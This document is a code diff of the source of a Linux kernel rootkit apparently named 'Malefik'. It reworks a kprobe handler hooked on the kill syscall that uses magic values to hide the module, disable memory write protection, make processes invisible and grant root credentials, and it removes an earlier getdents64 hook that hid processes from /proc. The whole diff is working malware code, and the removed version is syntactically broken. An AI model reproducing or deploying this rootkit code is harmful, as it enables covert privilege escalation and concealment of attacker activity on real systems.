@@ -32,97 +32,12 @@
 #define HIDE_PRO 2604
 #define GET_ROOT 2605
 
-#define DEBUG 0
+#define DEBUG 1
 
 static struct list_head *prev_module_in_proc_modules_lsmod;
 int is_hidden_proc = 0;
 int is_hidden_sys = 0;
 unsigned long cr0;
-
-
-/* HACKED HANDLER */
-static int hacked_handler(struct kprobe *p, struct pt_regs *regs)
-{
-    unsigned long syscall_num = regs->orig_ax;
-    struct task_struct *current_task = current;
-
-    int rdi = (int) regs->di;
-    int rsi = (int) regs->si;
-    int rdx = (int) regs->dx;
-
-    if (rsi == HAXX)
-    {
-        #if DEBUG
-        {
-            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ CALLED pid: %d.\n", current_task->pid);
-        }
-    }
-    else if (rsi == PROT)
-    {
-        protect_rootkit();
-        hide_rootkit();
-        #if DEBUG
-        {
-            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Rootkit protection enabled!!!!\n");
-        }
-    }
-    else if (rsi == UNPR)
-    {
-        unprotect_rootkit();
-        show_rootkit();
-        #if DEBUG
-        {
-            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Rootkit protection disabled!!!!\n");
-        }
-    else if (rsi == PROT_MEM)
-    {
-        protect_memory();
-        #if DEBUG
-        {
-            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Memory protection enabled!!!!\n");
-        }
-    }
-    else if (rsi == UNPR_MEM)
-    {
-        unprotect_memory();
-        #if DEBUG
-        {
-            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Memory protection disabled!!!!\n");
-        }
-    }
-    else if (rsi == HIDE_PRO)
-    {
-		if ((task = find_task(pid)) == NULL)
-			return -ESRCH;
-
-		task->flags = task->flags ^ PF_INVISIBLE;
-		#if DEBUG
-		{
-            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Hide/unhide process %d\n", pid);
-		}
-		#endif
-		break;
-    }
-    else if (rsi == GET_ROOT)
-    {
-        set_root();
-        #if DEBUG
-        {
-            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Offering you, root.\n");
-        }
-    }
-
-
-
-    return 0;
-}
-
-/* KPROBE */
-static struct kprobe syscall_catch_kprobe = {
-    .symbol_name = "__x64_sys_read",
-    .pre_handler = hacked_handler,
-};
-
 
 
 /* HIDE/SHOW ROOTKIT */
@@ -250,65 +165,6 @@ static int is_invisible(pid_t pid)
 	return 0;
 }
 
-/* HACK GETDENTS 64 */
-static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
-{
-	int fd = (int) pt_regs->di;
-
-	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs->si;
-
-	int ret = orig_getdents64(pt_regs), err;
-
-	unsigned short proc = 0;
-	unsigned long offset = 0;
-	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
-
-	struct inode *d_inode;
-
-	if (ret <= 0)
-		return ret;
-
-	kdirent = kzalloc(ret, GFP_KERNEL);
-
-	if (kdirent == NULL)
-		return ret;
-
-	err = copy_from_user(kdirent, dirent, ret);
-
-	if (err)
-		goto out;
-	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
-
-	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
-		proc = 1;
-
-	while (offset < ret)
-	{
-		dir = (void *)kdirent + offset;
-		if ((proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10))))
-		{
-			if (dir == kdirent)
-			{
-				ret -= dir->d_reclen;
-				memmove(dir, (void *)dir + dir->d_reclen, ret);
-				continue;
-			}
-			prev->d_reclen += dir->d_reclen;
-		}
-		else
-		{
-			prev = dir;
-		}
-		offset += dir->d_reclen;
-	}
-	err = copy_to_user(dirent, kdirent, ret);
-	if (err) {goto out;}
-
-out:
-	kfree(kdirent);
-	return ret;
-}
-
 /* SET ROOT */
 static void set_root(void)
 {
@@ -326,4 +182,100 @@ static void set_root(void)
 
 	commit_creds(root);
 }
+
+/* HACKED HANDLER */
+static int hacked_handler(struct kprobe *p, struct pt_regs *regs)
+{
+    unsigned long syscall_num = regs->orig_ax;
+    struct task_struct *current_task = current;
+
+    int rdi = (int) regs->di;
+    int rsi = (int) regs->si;
+    int rdx = (int) regs->dx;
+    int pid = (int) current_task->pid;
+
+    if (rsi == HAXX)
+    {
+        #if DEBUG
+        {
+            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ CALLED pid: %d.\n", pid);
+        }
+	    #endif
+    }
+    else if (rsi == PROT)
+    {
+        protect_rootkit();
+        hide_rootkit();
+        #if DEBUG
+        {
+            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Rootkit protection enabled!!!!\n");
+        }
+        #endif
+
+    }
+    else if (rsi == UNPR)
+    {
+        unprotect_rootkit();
+        hide_rootkit();
+        #if DEBUG
+        {
+            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Rootkit protection disabled!!!!\n");
+        }
+        #endif
+
+    }
+    else if (rsi == PROT_MEM)
+    {
+        protect_memory();
+        #if DEBUG
+        {
+            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Memory protection enabled!!!!\n");
+        }
+        #endif
+
+    }
+    else if (rsi == UNPR_MEM)
+    {
+        unprotect_memory();
+        #if DEBUG
+        {
+            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Memory protection disabled!!!!\n");
+        }
+        #endif
+
+    }
+    else if (rsi == HIDE_PRO)
+    {
+		struct task_struct *task;
+
+                if ((task = find_task(pid)) == NULL)
+                        return -ESRCH;
+
+                task->flags = task->flags ^ PF_INVISIBLE;
+                #if DEBUG
+                {
+                    pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Hide/unhide process %d\n", pid);
+                }
+                #endif
+		return 0;
+    }
+    else if (rsi == GET_ROOT)
+    {
+        set_root();
+        #if DEBUG
+        {
+            pr_info("ᛗᚨᛚᛖᚠᛁᚴ ~ Offering you, root.\n");
+        }
+        #endif
+
+    }
+
+    return 0;
+}
+
+/* KPROBE */
+static struct kprobe syscall_catch_kprobe = {
+    .symbol_name = "__x64_sys_kill",
+    .pre_handler = hacked_handler,
+};
 
